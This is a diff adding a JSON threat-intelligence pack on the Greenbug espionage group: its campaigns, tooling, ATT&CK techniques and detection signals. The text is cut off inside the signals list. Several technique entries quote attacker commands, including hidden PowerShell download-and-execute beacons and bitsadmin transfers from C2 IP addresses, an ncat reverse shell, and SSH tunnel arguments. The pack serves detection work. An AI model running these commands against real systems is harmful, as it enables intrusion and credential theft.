@@ -1,0 +1,483 @@
+{
+  "report_title": "Greenbug (ISMDOOR / ISMAgent espionage cluster; Shamoon credential-theft precursor) Actor Intelligence Pack — Stage-1 CTI Extraction",
+  "source": "Symantec 'Greenbug cyberespionage group targeting Middle East, possible links to Shamoon' (2017-01, https://www.security.com/threat-intelligence/shamoon-attacks-mount-middle-east); Symantec/SECURITY.COM 'Sophisticated Espionage Group Turns Attention to Telecom Providers in South Asia' (2020-05, https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia); NETSCOUT ASERT 'Greenbug's DNS-isms' (2017, https://www.netscout.com/blog/asert/greenbugs-dns-isms); MITRE ATT&CK Group Greenbug G0049 (public MITRE, https://attack.mitre.org/groups/G0049/). NOTE: in THIS environment's bundled ATT&CK dataset the id G0049 resolves to OilRig, not Greenbug — the public MITRE G0049 (Greenbug) is cited only as a source, and Greenbug-specific TTPs/IOCs are taken from the Symantec/NETSCOUT primary reports.",
+  "publication_date": "2026-08-30",
+  "actor": {
+    "name": "Greenbug",
+    "mitre_id": "",
+    "mitre_canonical_name": "Greenbug",
+    "aliases": [
+      "Greenbug",
+      "ISMDOOR group (named after primary backdoor)",
+      "public MITRE ATT&CK Group G0049 (Greenbug)"
+    ],
+    "related_clusters": [
+      "Shamoon / W32.Disttrack (Disttrack.B) wiper operators — Greenbug assessed as a likely credential-theft precursor cluster (Symantec)",
+      "OilRig / APT34 / Cobalt Gypsy (Iran-nexus) — tooling and targeting overlap; tracked here as its own cluster, overlap noted honestly not asserted",
+      "Timberworm / Cobalt Gypsy (Iran-nexus activity co-observed in the Shamoon 2 intrusions)"
+    ],
+    "attribution": "Iran-nexus cyber-espionage. Symantec assesses Greenbug operates in support of Iranian state interests, based on Middle East/Gulf targeting aligned with those interests, use of an Iran-nexus toolset (ISMDOOR/ISMAgent/ISMInjector, Nidiran), and temporal/host overlap with the destructive Shamoon 2 (W32.Disttrack.B) campaigns against Saudi organizations. Symantec detected an ISMDOOR infection on an administrator computer at an organization later hit with Disttrack, and assesses Greenbug MAY have supplied the credentials that Shamoon used to spread — i.e. a credential-theft precursor role — but stops short of a definitive same-operator claim. Activity also overlaps OilRig/APT34-adjacent Iran-nexus operations; this pack treats Greenbug as its own cluster and notes the overlap rather than merging attribution.",
+    "attribution_confidence": "medium",
+    "targeted_regions_mena": [
+      "Saudi Arabia",
+      "Iran",
+      "Iraq",
+      "Bahrain",
+      "Qatar",
+      "Kuwait",
+      "Turkey",
+      "United Arab Emirates"
+    ],
+    "targeted_regions_global": [
+      "Pakistan (South Asia telecom operators)",
+      "Australia (Saudi-owned company located in Australia)"
+    ],
+    "targeted_sectors": [
+      "Government",
+      "Telecommunications",
+      "Aviation",
+      "Energy / oil & gas",
+      "Investment / financial",
+      "Education"
+    ],
+    "key_campaigns": [
+      {
+        "name": "ISMDOOR espionage / Shamoon 2 credential-theft precursor",
+        "date": "2016 to early 2017",
+        "summary": "Greenbug used fake business-proposal spearphishing emails to deliver the Trojan.Ismdoor (ISMDOOR) PowerShell-based backdoor to aviation, investment, government and education organizations across Saudi Arabia, Iran, Iraq, Bahrain, Qatar, Kuwait and Turkey (and a Saudi company in Australia). ISMDOOR opened a backdoor, ran PowerShell for C2, and downloaded follow-on tools for keylogging and browser/email/credential harvesting, hiding payloads in NTFS alternate data streams. An ISMDOOR infection was found on an administrator machine at an organization subsequently struck by the Shamoon 2 (W32.Disttrack.B) disk-wiper, leading Symantec to assess Greenbug likely provided the credentials Shamoon used to propagate.",
+        "source_url": "https://www.security.com/threat-intelligence/shamoon-attacks-mount-middle-east"
+      },
+      {
+        "name": "ISMAgent / ISMInjector — UAE government",
+        "date": "2017-08",
+        "summary": "Continued development of the toolset: an attack on a United Arab Emirates government target used ISMAgent (a successor backdoor to ISMDOOR) delivered via ISMInjector, a Trojan that injects ISMAgent into legitimate processes. Backdoor.Nidiran was also associated with the group's operations.",
+        "source_url": "https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"
+      },
+      {
+        "name": "DNS-based ISMDOOR command-and-control shift",
+        "date": "2017",
+        "summary": "NETSCOUT ASERT documented Greenbug moving ISMDOOR away from HTTP C2 toward a DNS-based covert channel — using DNS queries (with AAAA/IPv6 responses) and a modified-base64 encoding to build a bidirectional command-and-control channel that better cloaks C2 traffic. The backdoor supports commands including Mimikatz execution (CreateMimi1Bat), keylogging (ExecuteKL), screenshots (PWS), system info (SI), Powercat (ExecutePC) and UAC-bypass scripts.",
+        "source_url": "https://www.netscout.com/blog/asert/greenbugs-dns-isms"
+      },
+      {
+        "name": "South Asia telecom espionage",
+        "date": "2019-04 to 2020-04",
+        "summary": "Greenbug targeted at least three telecom operators in Pakistan (South Asia), relying on off-the-shelf tools and living-off-the-land techniques for persistent, low-profile credential theft. Initial access via a CHM file (proposal_pakistan110.chm:error.html) with an ADS-hidden payload; post-exploitation with the Covenant .NET C2 (GRUNTStager.hta), Cobalt Strike and Metasploit; credential theft with Mimikatz and by decrypting web.config SQL connection strings via aspnet_regiis.exe; and persistent RDP access tunneled through HTTP proxies using Plink (comms.exe) and the Bitvise SSH client.",
+        "source_url": "https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"
+      }
+    ]
+  },
+  "threat_actors": ["Greenbug"],
+  "targeted_regions": ["Saudi Arabia", "Iran", "Iraq", "Bahrain", "Qatar", "Kuwait", "Turkey", "United Arab Emirates", "Pakistan", "Australia"],
+  "targeted_sectors": ["Government", "Telecommunications", "Aviation", "Energy", "Investment / financial", "Education"],
+  "malware": [
+    "Trojan.Ismdoor / ISMDOOR (PowerShell-based backdoor; DNS & HTTP C2)",
+    "ISMAgent (successor backdoor)",
+    "ISMInjector (injector that loads ISMAgent into processes)",
+    "Backdoor.Nidiran",
+    "Winit.exe / keylogger module (ISMDOOR ExecuteKL)"
+  ],
+  "tooling_observed": [
+    "PowerShell (ISMDOOR C2, downloadstring beacons, Powercat)",
+    "Mimikatz (credential dumping; ccd61.ps1, CreateMimi1Bat)",
+    "Cobalt Strike Beacon",
+    "Covenant (.NET C2 framework; GRUNTStager.hta)",
+    "Metasploit (msf.ps1)",
+    "Plink (renamed comms.exe — HTTP-proxy SSH/RDP tunneling)",
+    "Bitvise SSH client (command-line tunneling)",
+    "Ncat / Netcat (ncat.exe -e cmd.exe reverse shell)",
+    "Powercat (PowerShell netcat; dp.ps1)",
+    "bitsadmin / BITS (ingress tool transfer)",
+    "aspnet_regiis.exe (decrypt web.config connection strings)",
+    "Multiple webshells",
+    "LaZagne / credential dumpers (open-source credential-recovery tooling associated with the group)"
+  ],
+  "ttps": [
+    {
+      "technique_id": "T1566.001",
+      "technique_name": "Phishing: Spearphishing Attachment",
+      "tactic": "initial-access",
+      "procedure_description": "Greenbug sends fake business-proposal spearphishing emails carrying a malicious attachment to deliver the ISMDOOR backdoor; in the South Asia telecom campaign the lure was a compiled-HTML-help (CHM) file named proposal_pakistan110.chm with an ADS-hidden payload (error.html).",
+      "observed_tooling": ["Trojan.Ismdoor / ISMDOOR (PowerShell-based backdoor; DNS & HTTP C2)"],
+      "detection_feasibility": "high — inbound mail with CHM/HTA attachments and business-proposal lures is detectable via mail-gateway attachment-type policy, sandbox detonation, and named-file (proposal_pakistan110.chm) indicators",
+      "sources": ["https://www.security.com/threat-intelligence/shamoon-attacks-mount-middle-east", "https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1204.002",
+      "technique_name": "User Execution: Malicious File",
+      "tactic": "execution",
+      "procedure_description": "Initial code execution depends on the victim opening the delivered file — the CHM proposal (proposal_pakistan110.chm:error.html) was executed via a web browser and opened by archiver tools, showing a decoy PDF error message while the ADS payload ran.",
+      "observed_tooling": [],
+      "detection_feasibility": "medium — user opening a CHM/HTA spawning script interpreters is detectable via process-lineage (hh.exe/mshta.exe -> powershell.exe/cmd.exe) but depends on endpoint process telemetry",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1218.001",
+      "technique_name": "System Binary Proxy Execution: Compiled HTML File",
+      "tactic": "execution",
+      "procedure_description": "Greenbug abuses compiled HTML Help (.chm) files as an execution vector — the proposal_pakistan110.chm carried an embedded/ADS-hidden error.html payload executed via the HTML Help subsystem, and the group has favoured CHM delivery since 2016.",
+      "observed_tooling": [],
+      "detection_feasibility": "high — hh.exe executing a CHM from a user-download path and then spawning script interpreters is a rare, high-fidelity process-lineage detection",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1564.004",
+      "technique_name": "Hide Artifacts: NTFS File Attributes",
+      "tactic": "stealth",
+      "procedure_description": "Greenbug hides payloads in NTFS alternate data streams (ADS) to evade detection — the CHM lure carried its payload as the ADS proposal_pakistan110.chm:error.html, and ISMDOOR historically stored components in alternate data streams.",
+      "observed_tooling": [],
+      "detection_feasibility": "high — files carrying named alternate data streams (path:stream) and execution from an ADS are detectable via file-system telemetry (Sysmon FileCreateStreamHash EID 15) and ADS enumeration",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia", "https://www.security.com/threat-intelligence/shamoon-attacks-mount-middle-east"]
+    },
+    {
+      "technique_id": "T1059.001",
+      "technique_name": "Command and Scripting Interpreter: PowerShell",
+      "tactic": "execution",
+      "procedure_description": "PowerShell is Greenbug's core execution engine: ISMDOOR uses PowerShell for C2; the group runs hidden downloadstring beacons (PowerShell.exe -nop -w hidden -c ... IEX $L.downloadstring('http://95.179.177.157:445/...')), deploys Powercat (dp.ps1), Mimikatz loaders (ccd61.ps1), Metasploit (msf.ps1) and web.config credential-decryption scripts.",
+      "observed_tooling": ["PowerShell (ISMDOOR C2, downloadstring beacons, Powercat)"],
+      "detection_feasibility": "high — script-block/module logging captures hidden -nop -w hidden downloadstring/IEX beacons and named .ps1 loaders; PowerShell spawned from hh.exe/mshta.exe adds high-fidelity context",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia", "https://www.netscout.com/blog/asert/greenbugs-dns-isms"]
+    },
+    {
+      "technique_id": "T1059.003",
+      "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
+      "tactic": "execution",
+      "procedure_description": "Greenbug uses cmd.exe for discovery and a Netcat reverse shell — ncat.exe [IP] 8989 -e cmd.exe binds cmd to a listening port for interactive command execution.",
+      "observed_tooling": ["Ncat / Netcat (ncat.exe -e cmd.exe reverse shell)"],
+      "detection_feasibility": "medium — ncat.exe with the -e cmd.exe argument and cmd.exe children of unusual parents are detectable via command-line logging, but individual net/arp/whoami commands are common",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "tactic": "command-and-control",
+      "procedure_description": "Greenbug pulls follow-on tooling to victims via PowerShell net.webclient downloadstring calls to its C2 (e.g. http://95.179.177.157:8081/, http://185.205.210.46:1003/) and via BITS: bitsadmin /transfer a8f4 http://95.179.177.157:8081/asdfd CSIDL_APPDATA\\a8f4.exe.",
+      "observed_tooling": ["PowerShell (ISMDOOR C2, downloadstring beacons, Powercat)", "bitsadmin / BITS (ingress tool transfer)"],
+      "detection_feasibility": "high — PowerShell downloadstring and bitsadmin /transfer to raw IP:port URLs writing to CSIDL_APPDATA are detectable via process command-line, proxy and file-write telemetry",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1197",
+      "technique_name": "BITS Jobs",
+      "tactic": "stealth",
+      "procedure_description": "Greenbug abuses the Background Intelligent Transfer Service (bitsadmin /transfer) to download an executable from its C2 into the AppData directory, using a trusted OS service to blend the transfer with normal update traffic.",
+      "observed_tooling": ["bitsadmin / BITS (ingress tool transfer)"],
+      "detection_feasibility": "high — bitsadmin.exe /transfer with an external IP URL and the BITS-Client operational log (EID 3/4/59/60) provide high-fidelity detection of malicious BITS jobs",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1071.004",
+      "technique_name": "Application Layer Protocol: DNS",
+      "tactic": "command-and-control",
+      "procedure_description": "ISMDOOR moved from HTTP to a DNS-based covert channel, encoding a bidirectional C2 protocol into DNS queries with 32-character hex session IDs and structured labels (e.g. n.n.c.<session_id>.c2.com for session setup, <encoded_msg>.<msg_num>.dr.<session_id>.c2.com for transmission, www.<msg_num>.s.<session_id>.c2.com for retrieval) and static AAAA/IPv6 responses carrying data.",
+      "observed_tooling": ["Trojan.Ismdoor / ISMDOOR (PowerShell-based backdoor; DNS & HTTP C2)"],
+      "detection_feasibility": "medium — high-volume, high-entropy DNS queries with long hex subdomains and repetitive AAAA responses to the same base domain are detectable via DNS analytics, but blend with legitimate DNS and require baselining — hunt-leaning",
+      "sources": ["https://www.netscout.com/blog/asert/greenbugs-dns-isms"]
+    },
+    {
+      "technique_id": "T1071.001",
+      "technique_name": "Application Layer Protocol: Web Protocols",
+      "tactic": "command-and-control",
+      "procedure_description": "Earlier ISMDOOR variants and the Covenant/Cobalt Strike/Metasploit stagers used HTTP(S) for C2 and payload retrieval, including PowerShell beacons to http://95.179.177.157 and http://185.205.210.46 on non-standard ports.",
+      "observed_tooling": ["Cobalt Strike Beacon", "Covenant (.NET C2 framework; GRUNTStager.hta)"],
+      "detection_feasibility": "medium — HTTP beacons to raw-IP C2 on odd ports are detectable via proxy/netflow and JA3/beacon-interval analytics, but generic HTTP blends with normal traffic",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia", "https://www.netscout.com/blog/asert/greenbugs-dns-isms"]
+    },
+    {
+      "technique_id": "T1132.001",
+      "technique_name": "Data Encoding: Standard Encoding",
+      "tactic": "command-and-control",
+      "procedure_description": "ISMDOOR's DNS covert channel uses a modified base64 encoding (substituting = -> !, / -> &, + -> @) so encoded C2 messages remain valid DNS labels; the group also base64-encodes C2 arguments (e.g. domains vsiegru.com and kopilkaorukov.com decoded from base64 command arguments).",
+      "observed_tooling": ["Trojan.Ismdoor / ISMDOOR (PowerShell-based backdoor; DNS & HTTP C2)"],
+      "detection_feasibility": "medium — modified-base64 tokens in DNS labels/command lines are detectable via encoding/entropy heuristics, but require dedicated content inspection",
+      "sources": ["https://www.netscout.com/blog/asert/greenbugs-dns-isms", "https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1571",
+      "technique_name": "Non-Standard Port",
+      "tactic": "command-and-control",
+      "procedure_description": "Greenbug C2 uses non-standard ports for HTTP beacons and staging — e.g. 95.179.177.157 on ports 445 and 8081, and 185.205.210.46 on ports 1003 and 1131.",
+      "observed_tooling": ["Cobalt Strike Beacon", "Covenant (.NET C2 framework; GRUNTStager.hta)"],
+      "detection_feasibility": "medium — HTTP traffic on atypical ports (e.g. HTTP over 445/1003/1131) is detectable via protocol-vs-port mismatch analytics on netflow/proxy, but needs baselining",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1573.002",
+      "technique_name": "Encrypted Channel: Asymmetric Cryptography",
+      "tactic": "command-and-control",
+      "procedure_description": "Greenbug's Cobalt Strike and Covenant post-exploitation frameworks tunnel C2 over TLS-encrypted channels to conceal beacon content.",
+      "observed_tooling": ["Cobalt Strike Beacon", "Covenant (.NET C2 framework; GRUNTStager.hta)"],
+      "detection_feasibility": "low — TLS-wrapped C2 content is opaque; detection relies on JA3/JA3S fingerprints, certificate anomalies and beacon-timing analytics rather than payload inspection — hunt-leaning",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1090",
+      "technique_name": "Proxy",
+      "tactic": "command-and-control",
+      "procedure_description": "Greenbug relays connections through HTTP proxies to reach victim machines — Plink (renamed comms.exe) was invoked with -proxytype http_basic -proxyip [IP] and the Bitvise client used with proxy credentials to route tunneled RDP/Terminal-Services traffic.",
+      "observed_tooling": ["Plink (renamed comms.exe — HTTP-proxy SSH/RDP tunneling)", "Bitvise SSH client (command-line tunneling)"],
+      "detection_feasibility": "medium — plink/bitvise command lines with -proxytype/-proxyip and unexpected internal-to-external proxy chains are detectable via process command-line and netflow, but generic proxying blends with normal traffic",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1572",
+      "technique_name": "Protocol Tunneling",
+      "tactic": "command-and-control",
+      "procedure_description": "Greenbug maintains persistent low-profile access via SSH tunnels — Plink (comms.exe) builds reverse/RDP tunnels (e.g. -C -R [host]:4015:[host]:1540) through HTTP proxies, and the Bitvise SSH command-line client is used as an alternative tunneling tool to reach RDP/Terminal Services.",
+      "observed_tooling": ["Plink (renamed comms.exe — HTTP-proxy SSH/RDP tunneling)", "Bitvise SSH client (command-line tunneling)"],
+      "detection_feasibility": "high — plink.exe (or renamed comms.exe) and Bitvise clients with port-forwarding (-R/-L) arguments, and outbound SSH from hosts that normally never initiate SSH, are detectable via process and network telemetry",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1021.001",
+      "technique_name": "Remote Services: Remote Desktop Protocol",
+      "tactic": "lateral-movement",
+      "procedure_description": "Greenbug tunnels RDP/Terminal-Services sessions through its Plink and Bitvise SSH tunnels to interactively access and pivot between victim servers while masking the true source of the connections.",
+      "observed_tooling": ["Plink (renamed comms.exe — HTTP-proxy SSH/RDP tunneling)", "Bitvise SSH client (command-line tunneling)"],
+      "detection_feasibility": "medium — RDP (Type-10 4624) logons sourced from localhost/loopback tunnel endpoints or from hosts running plink/bitvise are detectable via correlation of logon and tunneling-process telemetry, but blend with admin RDP",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1003.001",
+      "technique_name": "OS Credential Dumping: LSASS Memory",
+      "tactic": "credential-access",
+      "procedure_description": "Greenbug dumps credentials with Mimikatz — ISMDOOR carries a CreateMimi1Bat command that executes Mimikatz via PowerShell (ccd61.ps1), and in the telecom campaign Mimikatz was executed on March 4 from %USERPROFILE%\\documents\\x64. This credential harvesting is the assessed precursor role that fed the Shamoon 2 wiper's propagation.",
+      "observed_tooling": ["Mimikatz (credential dumping; ccd61.ps1, CreateMimi1Bat)"],
+      "detection_feasibility": "high — process access to lsass.exe and Mimikatz signatures/command lines are highly observable via EDR process-access (Sysmon EID 10) and image-load telemetry",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia", "https://www.netscout.com/blog/asert/greenbugs-dns-isms"]
+    },
+    {
+      "technique_id": "T1056.001",
+      "technique_name": "Input Capture: Keylogging",
+      "tactic": "credential-access",
+      "procedure_description": "ISMDOOR downloads and runs a keylogger — the ExecuteKL command deploys keylogging functionality (Winit.exe) to capture keystrokes and harvest credentials and sensitive input from infected hosts.",
+      "observed_tooling": ["Winit.exe / keylogger module (ISMDOOR ExecuteKL)"],
+      "detection_feasibility": "high — a dropped keylogger executable (Winit.exe) writing capture files and registering keyboard hooks is detectable via file-write, process and known-hash telemetry",
+      "sources": ["https://www.netscout.com/blog/asert/greenbugs-dns-isms", "https://www.security.com/threat-intelligence/shamoon-attacks-mount-middle-east"]
+    },
+    {
+      "technique_id": "T1113",
+      "technique_name": "Screen Capture",
+      "tactic": "collection",
+      "procedure_description": "ISMDOOR supports a PWS command that captures screenshots of the victim's desktop for exfiltration.",
+      "observed_tooling": ["Trojan.Ismdoor / ISMDOOR (PowerShell-based backdoor; DNS & HTTP C2)"],
+      "detection_feasibility": "medium — screenshot capture leaves limited discrete signal; detectable mainly via known backdoor behavior/hashes and image-file writes to staging paths — hunt-leaning",
+      "sources": ["https://www.netscout.com/blog/asert/greenbugs-dns-isms"]
+    },
+    {
+      "technique_id": "T1552.001",
+      "technique_name": "Unsecured Credentials: Credentials In Files",
+      "tactic": "credential-access",
+      "procedure_description": "Greenbug recursively enumerated web.config files on servers to extract encrypted SQL-server connection strings, harvesting stored database credentials from application configuration files.",
+      "observed_tooling": ["PowerShell (ISMDOOR C2, downloadstring beacons, Powercat)", "aspnet_regiis.exe (decrypt web.config connection strings)"],
+      "detection_feasibility": "medium — recursive scans for web.config and reads of application config files are detectable via file-access telemetry and PowerShell script-block logs, but blend with legitimate admin/dev activity",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1140",
+      "technique_name": "Deobfuscate/Decode Files or Information",
+      "tactic": "stealth",
+      "procedure_description": "Greenbug decrypts the encrypted connection strings harvested from web.config using the legitimate .NET aspnet_regiis.exe utility to reveal cleartext SQL usernames/passwords, and base64-decodes obfuscated C2 command arguments (e.g. to recover the vsiegru.com and kopilkaorukov.com domains).",
+      "observed_tooling": ["aspnet_regiis.exe (decrypt web.config connection strings)"],
+      "detection_feasibility": "medium — aspnet_regiis.exe invoked with -pdf/decrypt arguments outside a deployment context is an unusual, detectable command-line pattern, but is a legitimate admin tool",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1543.003",
+      "technique_name": "Create or Modify System Process: Windows Service",
+      "tactic": "persistence",
+      "procedure_description": "For persistence, Greenbug created a Windows service named 'VMwareUpdate' (November 2019) running a malicious payload disguised as legitimate VMware software.",
+      "observed_tooling": [],
+      "detection_feasibility": "high — new service installation (Event ID 7045 / 4697) with a name mimicking VMware but an unsigned/anomalous image path is a high-fidelity detection",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1036.005",
+      "technique_name": "Masquerading: Match Legitimate Resource Name or Location",
+      "tactic": "stealth",
+      "procedure_description": "Greenbug names its malware and services to impersonate trusted software — the persistence service 'VMwareUpdate', and payloads named adobe.exe, java.ee, printers.exe and comms.exe (a renamed Plink) to blend with legitimate binaries.",
+      "observed_tooling": ["Plink (renamed comms.exe — HTTP-proxy SSH/RDP tunneling)"],
+      "detection_feasibility": "medium — vendor-like names in unusual paths and signed-tool binaries renamed (Plink -> comms.exe) are detectable via name/path/hash baselining and signature-vs-name mismatch",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1548.002",
+      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
+      "tactic": "privilege-escalation",
+      "procedure_description": "ISMDOOR runs PowerShell UAC-bypass routines to elevate — Invoke-bypassuac and Invoke-EventVwrBypass (the Event Viewer / eventvwr.exe hijack, delivered as ivb.ps1).",
+      "observed_tooling": ["PowerShell (ISMDOOR C2, downloadstring beacons, Powercat)"],
+      "detection_feasibility": "high — the eventvwr.exe UAC bypass leaves a distinctive registry write (HKCU\\Software\\Classes\\mscfile\\shell\\open\\command) and eventvwr.exe -> mmc/powershell lineage, both high-fidelity detections",
+      "sources": ["https://www.netscout.com/blog/asert/greenbugs-dns-isms"]
+    },
+    {
+      "technique_id": "T1087.001",
+      "technique_name": "Account Discovery: Local Account",
+      "tactic": "discovery",
+      "procedure_description": "Greenbug enumerates local accounts on victim hosts with net user and uses WMI to search for specific user accounts on target systems.",
+      "observed_tooling": ["Ncat / Netcat (ncat.exe -e cmd.exe reverse shell)"],
+      "detection_feasibility": "medium — net user and WMI account queries are detectable in command-line logs but are common admin actions; value comes from recon-burst/process-lineage correlation",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1047",
+      "technique_name": "Windows Management Instrumentation",
+      "tactic": "execution",
+      "procedure_description": "Greenbug employs WMI to query for specific user accounts on target systems during reconnaissance.",
+      "observed_tooling": [],
+      "detection_feasibility": "medium — WMI queries (wmic/Get-WmiObject) are detectable via command-line and WMI-activity logging, but are common; suspicious mainly in a recon-burst context",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1082",
+      "technique_name": "System Information Discovery",
+      "tactic": "discovery",
+      "procedure_description": "ISMDOOR gathers system information via an SI command, and operators enumerate drives/storage with Get-PSDrive -PSProvider FileSystem.",
+      "observed_tooling": ["Trojan.Ismdoor / ISMDOOR (PowerShell-based backdoor; DNS & HTTP C2)"],
+      "detection_feasibility": "medium — system-info enumeration is common and noisy; meaningful mainly within a tight recon-burst process-lineage window",
+      "sources": ["https://www.netscout.com/blog/asert/greenbugs-dns-isms", "https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1016",
+      "technique_name": "System Network Configuration Discovery",
+      "tactic": "discovery",
+      "procedure_description": "Greenbug enumerates network configuration with arp -a to view the ARP table and identify neighbouring hosts.",
+      "observed_tooling": [],
+      "detection_feasibility": "medium — arp/ipconfig discovery commands are detectable via command-line logging but common; value comes from correlation within a recon burst",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1049",
+      "technique_name": "System Network Connections Discovery",
+      "tactic": "discovery",
+      "procedure_description": "Greenbug runs netstat -a to enumerate active network connections and listening ports on compromised hosts.",
+      "observed_tooling": [],
+      "detection_feasibility": "medium — netstat execution is detectable in command-line logs but common; meaningful within recon-burst context",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1033",
+      "technique_name": "System Owner/User Discovery",
+      "tactic": "discovery",
+      "procedure_description": "Greenbug runs whoami to confirm the current user context on compromised hosts.",
+      "observed_tooling": [],
+      "detection_feasibility": "medium — whoami is trivially detectable in command-line logs but extremely common; only meaningful in process-lineage/recon-burst context",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1083",
+      "technique_name": "File and Directory Discovery",
+      "tactic": "discovery",
+      "procedure_description": "Greenbug enumerates drives and the filesystem with Get-PSDrive -PSProvider FileSystem and recursively searches for files of interest (e.g. web.config) on servers.",
+      "observed_tooling": ["PowerShell (ISMDOOR C2, downloadstring beacons, Powercat)"],
+      "detection_feasibility": "medium — file/directory enumeration is common and noisy; meaningful mainly in a tight recon-burst process-lineage window",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1505.003",
+      "technique_name": "Server Software Component: Web Shell",
+      "tactic": "persistence",
+      "procedure_description": "Greenbug deploys multiple webshells on compromised servers to maintain web-based remote access to victim telecom networks (several distinct webshell samples were recovered).",
+      "observed_tooling": ["Multiple webshells"],
+      "detection_feasibility": "high — new script files written to web-server content roots, anomalous w3wp.exe/httpd child processes, and the specific webshell hashes are detectable via file-integrity monitoring and web-server process telemetry",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1078",
+      "technique_name": "Valid Accounts",
+      "tactic": "persistence",
+      "procedure_description": "Greenbug reuses harvested credentials — SQL-server usernames/passwords decrypted from web.config were tested via PowerShell against database servers, and stolen administrator credentials underpin the group's assessed role of supplying access for the Shamoon 2 wiper's propagation.",
+      "observed_tooling": [],
+      "detection_feasibility": "medium — reuse of harvested valid credentials is detectable via anomalous-authentication analytics (new source host, first-seen credential, off-hours logon) but blends with legitimate use",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia", "https://www.security.com/threat-intelligence/shamoon-attacks-mount-middle-east"]
+    },
+    {
+      "technique_id": "T1608.001",
+      "technique_name": "Stage Capabilities: Upload Malware",
+      "tactic": "resource-development",
+      "procedure_description": "Greenbug stages payloads and beacon stagers on its own C2 servers (e.g. 95.179.177.157 and 185.205.210.46 serving GRUNTStager/beacon URLs) for retrieval by PowerShell and BITS during intrusions.",
+      "observed_tooling": ["Covenant (.NET C2 framework; GRUNTStager.hta)", "Cobalt Strike Beacon"],
+      "detection_feasibility": "low — malware staging on adversary-controlled infrastructure occurs off-victim; intel/hunt candidate via infrastructure tracking and retro-hunting the staging IPs/URLs",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia"]
+    },
+    {
+      "technique_id": "T1027.013",
+      "technique_name": "Obfuscated Files or Information: Encrypted/Encoded File",
+      "tactic": "stealth",
+      "procedure_description": "Greenbug delivers encoded/obfuscated stagers and payloads (e.g. the Covenant GRUNTStager.hta and base64/HTA-wrapped scripts) to hinder static detection, alongside the modified-base64 encoding of its DNS C2 messages.",
+      "observed_tooling": ["Covenant (.NET C2 framework; GRUNTStager.hta)"],
+      "detection_feasibility": "medium — high-entropy/encoded HTA and script payloads are detectable via file-entropy and encoding heuristics but require dedicated scanning",
+      "sources": ["https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia", "https://www.netscout.com/blog/asert/greenbugs-dns-isms"]
+    }
+  ],
+  "detection_signals": [
+    "Business-proposal spearphishing with CHM/HTA attachments; the named lure proposal_pakistan110.chm and execution of its ADS payload proposal_pakistan110.chm:error.html",
+    "Files carrying named NTFS alternate data streams (path:stream) and execution from an ADS — ISMDOOR/CHM tradecraft (Sysmon EID 15 FileCreateStreamHash)",
+    "hh.exe (Compiled HTML Help) launching a CHM from a download path and spawning powershell.exe/cmd.exe/mshta.exe",
+    "Hidden PowerShell beacons: PowerShell.exe -nop -w hidden -c ... IEX $x.downloadstring('http://<rawIP>:<port>/...'); named loaders ccd61.ps1 (Mimikatz), ivb.ps1 (eventvwr UAC bypass), dp.ps1 (Powercat), msf.ps1 (Metasploit)",
